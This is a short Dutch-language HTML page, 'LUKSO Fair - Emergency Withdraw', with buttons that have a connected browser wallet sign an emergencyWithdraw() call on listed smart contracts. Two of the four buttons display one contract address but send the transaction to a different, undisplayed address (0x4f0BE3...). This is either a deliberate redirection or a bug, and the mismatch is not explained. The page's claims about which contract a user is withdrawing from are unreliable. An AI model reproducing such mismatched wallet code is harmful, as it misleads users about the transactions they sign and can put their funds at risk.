<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>LUKSO Fair - Emergency Withdraw</title>
<style>
body{font-family:sans-serif;background:#1a0a2e;color:white;padding:20px;max-width:600px;margin:0 auto}
h1{color:#f5c842}
button{background:#c0392b;color:white;border:none;padding:12px 24px;border-radius:8px;font-size:14px;cursor:pointer;margin:8px 0;width:100%}
button:hover{background:#e74c3c}
.info{background:rgba(255,255,255,0.1);padding:10px;border-radius:8px;margin:8px 0;font-size:12px;word-break:break-all}
.success{background:rgba(0,255,0,0.2);padding:12px;border-radius:8px;margin:10px 0}
.error{background:rgba(255,0,0,0.2);padding:12px;border-radius:8px;margin:10px 0}
</style>
</head>
<body>
<h1>⚠️ Emergency Withdraw</h1>
<p>Klik op de knop van het contract waar jouw sessie vastzit.</p>

<div class="info">0x4CfC882b4BE8Cd8573673B9CC431dD730F3c01d3</div>
<button onclick="withdraw('0x4f0BE3bbEA5CAda66D49325D9280dAF6F0395742')">Withdraw 0x4CfC...</button>

<div class="info">0xa4c687cC1802c9ce9B6b024E46129fE3c645fe97</div>
<button onclick="withdraw('0xa4c687cC1802c9ce9B6b024E46129fE3c645fe97')">Withdraw 0xa4c6...</button>

<div class="info">0xf857789b021f4D55923A09F67741CD113Bfcc872</div>
<button onclick="withdraw('0x4f0BE3bbEA5CAda66D49325D9280dAF6F0395742')">Withdraw 0xf857...</button>

<div class="info">0x8a0E45C36a8804F70C40a5413cB48B2C0B016081</div>
<button onclick="withdraw('0x8a0E45C36a8804F70C40a5413cB48B2C0B016081')">Withdraw 0x8a0E...</button>

<div id="log"></div>

<script src="https://cdn.jsdelivr.net/npm/ethers@6.9.0/dist/ethers.umd.min.js"></script>
<script>
async function withdraw(addr) {
  const log = document.getElementById('log');
  try {
    const p = window.lukso || window.ethereum;
    if(!p){log.innerHTML='<div class="error">Geen wallet!</div>';return;}
    const ep = new ethers.BrowserProvider(p);
    const signer = await ep.getSigner();
    log.innerHTML = '<div class="info">Versturen naar ' + addr.slice(0,10) + '...</div>';
    const sm = new ethers.Contract(addr, ["function emergencyWithdraw() external"], signer);
    const tx = await sm.emergencyWithdraw({gasLimit:150000});
    await tx.wait();
    log.innerHTML = '<div class="success">✅ Geslaagd! ' + tx.hash.slice(0,20) + '...</div>';
  } catch(e) {
    log.innerHTML = '<div class="error">❌ ' + e.message.slice(0,100) + '</div>';
  }
}
</script>
</body>
</html>
